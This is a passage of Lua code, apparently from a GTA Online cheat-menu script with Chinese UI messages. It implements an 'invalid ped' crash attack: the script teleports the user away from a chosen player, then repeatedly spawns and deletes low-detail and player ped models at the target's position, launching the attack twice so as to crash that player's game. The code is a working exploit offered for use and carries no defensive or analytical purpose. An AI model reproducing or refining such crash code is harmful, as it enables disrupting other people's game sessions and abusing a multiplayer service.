            GUI.AddToast("无效ped同步崩", "❌ 无法获取目标玩家", 2000, eToastPos.BOTTOM_RIGHT)
            return
        end

        local function teleportIfTooClose()
            local localPed = GTA.GetLocalPed()
            if not localPed then return end

            local localPos = localPed.Position
            local targetPos = targetCPed.Position
            local dx = localPos.x - targetPos.x
            local dy = localPos.y - targetPos.y
            local dz = localPos.z - targetPos.z
            local dist = math.sqrt(dx*dx + dy*dy + dz*dz)

            if dist < 600.0 then
                local newX = targetPos.x + 600.0
                local newY = targetPos.y
                local newZ = targetPos.z

                local groundFound, groundZ = GTA.GetGroundZ(newX, newY)
                if groundFound then
                    newZ = groundZ + 1.0
                end

                local pedHandle = GTA.PointerToHandle(localPed)
                if pedHandle and pedHandle ~= 0 then
                    Natives.InvokeVoid(0x06843DA7060A026B, pedHandle, newX, newY, newZ, false, false, false, false)
                    Script.Yield(100)
                end
            end
        end

        local nullPeds = {
            Utils.Joaat("slod_human"),
            Utils.Joaat("slod_large_quadped"),
            Utils.Joaat("slod_small_quadped"),
            Utils.Joaat("player_zero"),
            Utils.Joaat("player_one"),
            Utils.Joaat("player_two"),
            Utils.Joaat("mp_m_freemode_01"),
            Utils.Joaat("mp_f_freemode_01")
        }

        local function executeCrash(taskId)
            Script.QueueJob(function()
                local target = Players.GetCPed(playerId)
                if not target then
                    GUI.AddToast("无效ped崩", "⚠️ 目标已离开，任务终止", 1000)
                    return
                end

                local targetPos = target.Position

                for round = 1, 5 do
                    target = Players.GetCPed(playerId)
                    if not target then break end
                    targetPos = target.Position

                    for _, modelHash in ipairs(nullPeds) do
                        Natives.InvokeVoid(0x963D27A58DF860AC, modelHash)
                        Script.Yield(200)

                        local ped = GTA.CreatePed(modelHash, 26, targetPos.x, targetPos.y, targetPos.z + 1.0, 0.0, true, false)
                        if ped ~= 0 then
                            Natives.InvokeVoid(0xAD738C3085FE7E11, ped, true, true)
                            Script.Yield(30)

                            local pedPtr = Memory.AllocInt()
                            Memory.WriteInt(pedPtr, ped)
                            Natives.InvokeVoid(0xAE3CBE5BF394C9C9, pedPtr)
                            Memory.Free(pedPtr)
                        end

                        Natives.InvokeVoid(0x0F07E7745A236711, modelHash)
                        Script.Yield(10)
                    end

                    Script.Yield(100)
                end

                GUI.AddToast("无效ped崩", "✅ 第 " .. taskId .. " 次执行完成", 1500, eToastPos.TOP_RIGHT)
            end)
        end

        Script.QueueJob(function()
            teleportIfTooClose()
            Script.Yield(50)
            executeCrash(1)
            executeCrash(2)
            GUI.AddToast("无效ped崩", "🚀 已同时启动两次崩溃任务", 2000, eToastPos.TOP_RIGHT)
        end)
    end,
    true
